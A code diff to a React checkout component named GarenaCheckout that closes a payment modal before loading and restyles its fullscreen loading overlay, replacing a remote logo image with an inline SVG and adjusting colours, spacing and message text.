@@ -302,8 +302,9 @@ export default function GarenaCheckout() {
       }
     }
     
+    setShowPayModal(false);
     setLoading(true);
-    setLoadingMessage('Initiating Secure Payment Gateway...');
+    setLoadingMessage('Connecting to Secure Payment Gateway…');
     setError('');
 
     try {
@@ -630,46 +631,63 @@ export default function GarenaCheckout() {
       fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
       WebkitFontSmoothing: 'antialiased'
     }}>
-      {/* 5-SECOND LOADING OVERLAY */}
+      {/* FULLSCREEN LOADING OVERLAY */}
       {loading && (
         <div
           style={{
-            position: 'fixed', inset: 0, zIndex: 9999,
-            background: 'rgba(5,7,10,0.88)',
-            backdropFilter: 'blur(8px)',
-            display: 'flex', flexDirection: 'column',
-            alignItems: 'center', justifyContent: 'center', gap: 24,
-            padding: 20, textAlign: 'center'
+            position: 'fixed',
+            inset: 0,
+            zIndex: 999999,
+            background: 'rgba(10, 12, 16, 0.92)',
+            backdropFilter: 'blur(10px)',
+            WebkitBackdropFilter: 'blur(10px)',
+            display: 'flex',
+            flexDirection: 'column',
+            alignItems: 'center',
+            justifyContent: 'center',
+            gap: 20,
+            padding: 24,
+            textAlign: 'center'
           }}
         >
-          <img
-            src="https://official.garena.com/ph/v1/assets/garena_logo_horizontal.svg"
-            alt="Garena"
-            style={{ height: 36, objectFit: 'contain', opacity: 0.95 }}
-          />
-          <div style={{ display: 'flex', gap: 10 }}>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+            <svg viewBox="0 0 34 36" fill="none" style={{ width: 34, height: 36 }}>
+              <g id="Union">
+                <path d="M19.7828 0L24.8706 6.87707H33.3986L28.3108 0H19.7828Z" fill="#EE2C24" />
+                <path d="M0 0V35.6322L20.8929 7.39735L15.4418 0H0Z" fill="#EE2C24" />
+                <path d="M28.3109 0L7.41797 28.2348L12.8691 35.6322H28.3109V0Z" fill="#EE2C24" />
+              </g>
+            </svg>
+            <span style={{ fontSize: 24, fontWeight: 900, color: '#ffffff', letterSpacing: '0.5px' }}>GARENA</span>
+          </div>
+
+          <div style={{ display: 'flex', gap: 10, marginTop: 8 }}>
             {[0, 1, 2].map(i => (
               <div
                 key={i}
                 style={{
-                  width: 12, height: 12, borderRadius: '50%',
+                  width: 12,
+                  height: 12,
+                  borderRadius: '50%',
                   background: '#ee2c24',
+                  boxShadow: '0 0 12px rgba(238, 44, 36, 0.8)',
                   animation: 'garena-bounce 1.2s ease-in-out infinite',
                   animationDelay: `${i * 0.2}s`,
                 }}
               />
             ))}
           </div>
-          <div style={{ fontSize: 15, color: '#ffffff', fontWeight: 700, letterSpacing: 0.4 }}>
+
+          <div style={{ fontSize: 16, color: '#ffffff', fontWeight: 800, letterSpacing: 0.3, marginTop: 4 }}>
             {loadingMessage}
           </div>
-          <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', fontWeight: 500 }}>
-            Please do not refresh or close this page
+          <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.6)', fontWeight: 500 }}>
+            Please do not refresh or close this window
           </div>
           <style>{`
             @keyframes garena-bounce {
               0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
-              40% { transform: scale(1.1); opacity: 1; }
+              40% { transform: scale(1.2); opacity: 1; }
             }
           `}</style>
         </div>
